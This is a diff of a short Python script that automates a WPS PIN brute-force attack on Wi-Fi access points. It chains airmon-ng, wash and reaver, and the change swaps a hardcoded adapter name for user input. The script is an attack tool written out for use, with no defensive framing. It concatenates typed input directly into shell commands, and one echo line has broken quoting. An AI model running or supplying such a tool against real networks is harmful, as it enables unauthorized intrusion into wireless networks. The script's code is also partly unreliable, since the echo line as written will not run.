@@ -4,9 +4,10 @@ import socket
 
 os.system("clear")
 os.system("airmon-ng check kill")
-os.system("airmon-ng start wlan0")
-os.system("wash -i wlan0mon")
+os.system("iwconfig")
+WLANinput=raw_input("\nEnter your adapter name:")
+os.system("airmon-ng start " + WLANinput)
+os.system("wash -i " + WLANinput)
 os.system("echo "Control+C when your done looking")
 MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
-
-os.system("reaver -i wlan0mon -b " + MACinput + " -d 30 -S -N -vv")
+os.system("reaver -i " + WLANinput + " -b " + MACinput + " -d 30 -S -N -vv")
